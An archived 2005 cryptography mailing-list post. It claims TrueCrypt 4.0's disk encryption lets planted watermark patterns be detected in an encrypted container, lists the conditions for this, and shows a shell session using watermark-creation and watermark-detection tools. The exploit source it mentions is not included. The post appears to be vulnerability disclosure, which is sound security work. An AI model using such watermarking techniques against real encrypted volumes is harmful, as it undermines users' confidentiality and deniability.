
@_date: 2005-11-17 07:16:48
@_author: Jari Ruusu 
@_subject: gonzo cryptography; how would you improve existing cryptosystems? 
Unfortunately truecrypt is just another broken device crypto implementation
that uses good ciphers in insecure way. Specially crafted static bit
patterns are easily detectable through that kind of bad crypto.
Requirements: (1) used ciphers must have 128-bit block size and (2) file
system where bit patterns are stored must have 2K or larger soft block size.
Many popular linux file systems meet those requirements. Uuencoded exploit
source code is included in this email.
# truecrypt --device-number 0 --filesystem ext2 /tmp/container1.tc /mnt
Enter password for '/tmp/container1.tc':
# mount | grep /mnt
# tune2fs -l /dev/mapper/truecrypt0 | grep "Block size"
Block size:               4096
# ./create-watermark-encodings-truecrypt 10:44 11:55 12:66 666:77 >/mnt/foo1
# truecrypt -d /mnt
# truecrypt -l
truecrypt: Kernel module not loaded
# ./detect-watermark-encodings-truecrypt </tmp/container1.tc
5241344 bytes scanned
watermark encoding 10, count 44
watermark encoding 11, count 55
watermark encoding 12, count 66
watermark encoding 666, count 77
# uname -s -r
Linux 2.6.14.2
# truecrypt --version | head -n 1
truecrypt 4.0
